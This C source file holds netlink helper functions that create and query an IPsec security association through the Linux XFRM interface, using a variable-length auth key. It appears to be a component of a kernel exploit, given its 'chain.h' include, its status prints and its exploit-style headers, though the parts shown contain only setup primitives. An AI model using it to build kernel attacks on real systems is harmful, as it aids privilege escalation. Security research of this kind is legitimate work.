#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <linux/sched.h>

#include "chain.h"

#define SPI 0x100

// Function to initialize the NETLINK_XFRM socket
int init_xfrm_socket() {
	struct sockaddr_nl addr; 
	int result = -1,xfrm_socket;
	xfrm_socket = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (xfrm_socket<=0){
		perror("[-] bad NETLINK_XFRM socket ");
		return result;
	}
    addr.nl_family = PF_NETLINK;  
    addr.nl_pad    = 0;  
    addr.nl_pid    = getpid();  
    addr.nl_groups = 0;
    result = bind(xfrm_socket, (struct sockaddr *)&addr, sizeof(addr));
   	if (result<0){
		perror("[-] bad bind ");
		close(xfrm_socket);
		return result;
	} 
	return xfrm_socket;
}

// Function to send an XFRM_MSG_NEWSA request to create a new SA
int send_xfrm_add_sa(int xfrm_socket, int keylen, void *keybuf) {
	struct nlmsghdr *nlhdr;
	struct sockaddr_nl nladdr;
	struct msghdr msg;
	struct iovec iov;
	int len = keylen+400,err;
	char *data;

	memset(&nladdr, 0, sizeof(nladdr));
	nladdr.nl_family = AF_NETLINK;
	nladdr.nl_pid = 0;
	nladdr.nl_groups = 0;
	nlhdr = (struct nlmsghdr *)malloc(NLMSG_SPACE(len));
	memset(nlhdr,0,NLMSG_SPACE(len));

	nlhdr->nlmsg_len = NLMSG_LENGTH(len);
	nlhdr->nlmsg_flags = NLM_F_REQUEST;
	nlhdr->nlmsg_pid = getpid();
	nlhdr->nlmsg_type = XFRM_MSG_NEWSA;

	data = NLMSG_DATA(nlhdr); 
	struct xfrm_usersa_info xui;
	memset(&xui,0,sizeof(xui));
	xui.family = AF_INET;
	xui.id.proto = IPPROTO_ESP;
	xui.id.spi = htonl(SPI);
	xui.id.daddr.a4 = inet_addr("127.0.0.1");
	xui.lft.hard_byte_limit = 0x10000000;
	xui.lft.hard_packet_limit = 0x10000000;
	xui.lft.soft_byte_limit = 0x1000;
	xui.lft.soft_packet_limit = 0x1000;
	xui.mode = XFRM_MODE_TRANSPORT;
	xui.flags = XFRM_STATE_ICMP; // XFRM_STATE_ESN==>replay_window > 0
	memcpy(data,&xui,sizeof(xui));
	data += sizeof(xui);
    
	struct nlattr nla;
	memset(&nla, 0, sizeof(nla));

    struct xfrm_algo xa;
    memset(&xa, 0, sizeof(xa));

    // Add encryption algorithm
    memset(&nla, 0, sizeof(nla));
    xa.alg_key_len = 128;
    nla.nla_len = sizeof(xa) + sizeof(nla) + (xa.alg_key_len + 7) / 8;
    nla.nla_type = XFRMA_ALG_CRYPT;
    memcpy(data, &nla, sizeof(nla));
    data += sizeof(nla);
    strcpy(xa.alg_name, "cbc(aes)");
    memcpy(data, &xa, sizeof(xa));
    data += sizeof(xa);
    // Add encryption key
    unsigned char key[16] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 
                             0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
    memcpy(data, key, sizeof(key));
    data += sizeof(key);

    memset(&xa, 0, sizeof(xa));
    nla.nla_len = sizeof(xa) + sizeof(nla) + keylen;  // 32 bytes for 256-bit key
    nla.nla_type = XFRMA_ALG_AUTH;
    memcpy(data, &nla, sizeof(nla));
    data += sizeof(nla);
    strcpy(xa.alg_name, "sha256");
    xa.alg_key_len = keylen*8;
    memcpy(data, &xa, sizeof(xa));
    data += sizeof(xa);
    // Add the key itself, here using a dummy key of 32 bytes
    memcpy(data, keybuf, keylen);
    data += keylen;

	iov.iov_base = (void *)nlhdr;
	iov.iov_len = nlhdr->nlmsg_len;
	memset(&msg, 0, sizeof(msg));
	msg.msg_name = (void *)&(nladdr);
	msg.msg_namelen = sizeof(nladdr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
    printf("[+] packet size=%ld\n", data-(char*)nlhdr);
 	//dump_data(&msg,iov.iov_len);
	err = sendmsg (xfrm_socket, &msg, 0); 
	if (err<0){
		perror("[-] bad sendmsg");
	}
	return err;
}

// Function to send an XFRM_MSG_GETSA request
int send_xfrm_get_sa(int xfrm_socket) {
    struct {
        struct nlmsghdr nlh;
        struct xfrm_usersa_id xsid;
    } req;

    memset(&req, 0, sizeof(req));

    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_id));
    req.nlh.nlmsg_type = XFRM_MSG_GETSA;
    req.nlh.nlmsg_flags = NLM_F_REQUEST;
    req.nlh.nlmsg_pid = getpid();

    req.xsid.daddr.a4 = inet_addr("127.0.0.1");
    req.xsid.spi = htonl(SPI);
    req.xsid.proto = IPPROTO_ESP;
    req.xsid.family = AF_INET;

    struct sockaddr_nl dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;

    struct iovec iov = {
        .iov_base = &req,
        .iov_len = req.nlh.nlmsg_len
    };

    struct msghdr msg = {
        .msg_name = &dest_addr,
        .msg_namelen = sizeof(dest_addr),
        .msg_iov = &iov,
        .msg_iovlen = 1
    };

    if (sendmsg(xfrm_socket, &msg, 0) < 0) {
        perror("sendmsg");
        return -1;
    }

    return 0;
}